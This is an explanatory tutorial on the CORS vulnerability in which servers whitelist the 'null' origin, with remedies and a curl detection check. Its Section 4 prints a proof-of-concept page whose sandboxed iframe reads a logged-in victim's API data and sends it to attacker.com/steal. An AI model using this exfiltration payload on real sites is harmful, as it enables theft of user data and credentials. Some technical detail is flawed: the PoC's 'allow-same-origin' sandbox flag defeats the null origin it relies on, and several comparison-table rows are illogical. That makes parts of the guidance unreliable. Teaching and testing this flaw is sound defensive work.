# Whitelisted null origin value


---

## 1. What is a `null` origin? (Simple explanation)

Normally, the `Origin` header contains a real website address like:
```
Origin: https://google.com
Origin: https://your-bank.com
```

But sometimes, the browser **cannot determine** a meaningful origin. In those cases, it sends:
```
Origin: null
```

Think of `null` as the browser saying: *"I honestly don't know where this request came from — it could be from anywhere or nowhere."*

---

## 2. When does the browser send `Origin: null`?

Here are the real situations (with simple explanations):

### Situation 1: Local HTML files
You save a webpage on your computer as `C:/attack.html` and open it in your browser.  
The browser sends: `Origin: null` because `file://` has no real domain.

### Situation 2: Sandboxed iframes
An attacker creates an iframe with the `sandbox` attribute:
```html
<iframe sandbox="allow-scripts" src="https://evil.com/attack.html"></iframe>
```
The sandbox strips away origin information → browser sends `Origin: null`.

### Situation 3: Data URLs
A webpage loads content from a `data:` URL:
```html
<iframe src="data:text/html,<script>...</script>"></iframe>
```
Data URLs don't have an origin → browser sends `Origin: null`.

### Situation 4: Cross-origin redirects
A request gets redirected from one domain to another in a certain way → browser sends `Origin: null`.

---

## 3. The vulnerability: When servers whitelist `null`

Some lazy or uninformed developers do this:

```javascript
// Bad code example
const allowedOrigins = [
    "https://normal-website.com",
    "https://api.normal-website.com",
    "null"  // ← DANGEROUS!
];

if (allowedOrigins.includes(requestOrigin)) {
    setHeader("Access-Control-Allow-Origin", requestOrigin);
    setHeader("Access-Control-Allow-Credentials", "true");
}
```

**Why would anyone add `null` to the whitelist?**
- During testing, they saw errors because `null` was being rejected.
- They added `null` to "make it work" and forgot to remove it.
- They didn't understand the security risk.

---

## 4. How attackers exploit this (step by step)

### Step 1: Attacker finds server whitelists `null`
Attacker sends a test request with `Origin: null` and sees the server responds with:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
✅ Confirmed vulnerable.

### Step 2: Attacker creates a sandboxed iframe exploit

Malicious page on `attacker.com`:
```html
<!DOCTYPE html>
<html>
<body>
  <iframe sandbox="allow-scripts allow-same-origin" 
          srcdoc='
            <script>
              fetch("https://normal-website.com/api/user-data", {
                credentials: "include"
              })
              .then(r => r.text())
              .then(data => {
                fetch("https://attacker.com/steal?data=" + encodeURIComponent(data));
              });
            </script>
          '>
  </iframe>
</body>
</html>
```

### Step 3: What happens when victim visits this page

1. Victim is logged into `normal-website.com` (has valid cookies).

2. Victim visits `https://attacker.com/exploit.html`.

3. The sandboxed iframe loads. Because of `sandbox` attribute, the browser sends all requests from that iframe with `Origin: null`.

4. The iframe's script tries to fetch `https://normal-website.com/api/user-data`.

5. Browser adds headers:
   ```
   GET /api/user-data HTTP/1.1
   Host: normal-website.com
   Origin: null
   Cookie: sessionid=abc123...
   ```

6. Vulnerable server checks: "Is `null` in my whitelist?" → YES.

7. Server responds:
   ```
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
   Content-Type: application/json
   
   {"email": "victim@email.com", "apiKey": "secret123", "balance": 5000}
   ```

8. Browser sees: `Access-Control-Allow-Origin: null` matches the iframe's origin (`null`) → allows JavaScript to read the response.

9. The stolen data is sent to `attacker.com/steal`.

---

## 5. Why this is extra dangerous

| **Normal CORS exploit** | **Null origin exploit** |
|-------------------------|-------------------------|
| Attacker needs a real domain | Attacker can use `file://`, `data://`, sandboxed iframes |
| Leaves traces in server logs | Harder to trace because origin is `null` |
| Requires DNS registration | Can work completely offline or anonymously |
| Easier to block (just block attacker's domain) | Harder to block because `null` is a single value |

---

## 6. Real-world analogy

**Normal security rule:**  
"Only let in people wearing company badges (real domains)."

**Server that whitelists `null`:**  
"Also let in people wearing **no badge at all** — just anyone who says 'I don't have a badge'."

**Attacker:**  
Shows up without a badge and says "I don't have a badge."  
Guard checks list: "No badge" is on the list → "Come right in!"

The attacker didn't need to forge anything — the server explicitly allowed no-badge entry.

---

## 7. Why developers mistakenly whitelist `null`

### Scenario (very common):
Developer tests CORS configuration locally:
1. Opens `file:///C:/myproject/test.html` in browser.
2. Makes API request to `https://normal-website.com`.
3. Browser sends `Origin: null`.
4. Server rejects it (because `null` not in whitelist).
5. Developer sees CORS error.
6. Developer thinks: "I'll just add `null` to the whitelist to fix testing."
7. Forgets to remove it before going to production. 💥

---

## 8. How to fix it (for server developers)

### Never, ever whitelist `null` in production.

**Bad:**
```javascript
allowedOrigins = ["https://normal-website.com", "null"];
```

**Good:**
```javascript
allowedOrigins = ["https://normal-website.com", "https://api.normal-website.com"];
// No null!
```

**Even better:** Reject `null` explicitly:
```javascript
if (origin === "null") {
    return; // Reject - don't set ACAO header
}
```

**Best practice:** 
- Only allow specific, real domains.
- Never add `null` unless you have an extremely specific reason AND understand the risk.
- Remove testing configurations before production.

---

## 9. Detection: How to check if a site is vulnerable

Use `curl` to test:
```bash
curl -H "Origin: null" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS \
     https://normal-website.com/api/endpoint \
     -v
```

If the response includes:
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
→ Site is vulnerable.

---

## 10. Summary table

| **Concept** | **Simple explanation** |
|-------------|------------------------|
| `Origin: null` | Browser says "I don't know where this came from" |
| When it happens | Local files, sandboxed iframes, data URLs |
| The mistake | Server adds `null` to allowed origins list |
| The exploit | Attacker uses sandboxed iframe to send `null` origin |
| Why it works | Server says "null is allowed" and reflects it back |
| The result | Attacker steals data from victim's session |
| The fix | NEVER whitelist `null` |

---

## The one-sentence takeaway

> **Whitelisting `null` in CORS is like telling a security guard to let in anyone who says "I don't have ID" — attackers will immediately abuse it using sandboxed iframes or local files.**

If you remember nothing else:  
`null` is **not** a real domain — it's the absence of an origin. Treat it as untrusted.